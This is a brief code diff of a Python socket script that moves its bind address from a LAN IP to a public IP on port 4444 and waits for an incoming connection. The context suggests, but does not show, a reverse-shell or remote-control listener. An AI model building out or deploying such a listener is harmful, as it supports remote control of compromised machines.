@@ -3,7 +3,7 @@ import codecs
 import os
 import sys
 s = socket.socket()
-s.bind(("192.168.1.6",4444))
+s.bind(("64.227.13.249",4444))
 s.listen(5)
 s.settimeout(2)
 c,a = s.accept()
